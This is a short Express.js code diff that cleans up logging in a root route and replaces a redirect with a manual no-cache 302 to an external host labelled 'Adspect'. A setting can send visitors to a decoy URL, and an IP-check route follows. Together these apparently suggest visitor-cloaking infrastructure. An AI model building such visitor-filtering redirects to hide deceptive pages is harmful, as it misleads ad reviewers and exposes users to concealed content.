@@ -463,24 +463,26 @@ app.get('/', async (req, res) => {
     console.log('Root route accessed:');
     console.log('- Website enabled:', state.settings.websiteEnabled);
     console.log('- Is admin panel:', isAdminPanel);
-    console.log('- Current state:', state);
-    console.log('- All request headers:', req.headers);  // Add this
     
     if (isAdminPanel) {
         return next();
     }
     
     if (!state.settings.websiteEnabled) {
-        console.log('- Redirecting to Google:', state.settings.redirectUrl);
+        console.log('- Website disabled, redirecting to:', state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
 
+    // Use 302 temporary redirect and ensure headers are set
     console.log('- Redirecting to Adspect:', 'https://redirectingroute.com/');
-    const redirectResponse = res.redirect('https://redirectingroute.com/');
-    console.log('- Redirect response:', redirectResponse);  // Add this
-    return redirectResponse;
+    res.writeHead(302, {
+        'Location': 'https://redirectingroute.com/',
+        'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+    });
+    return res.end();
 });
-
 
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
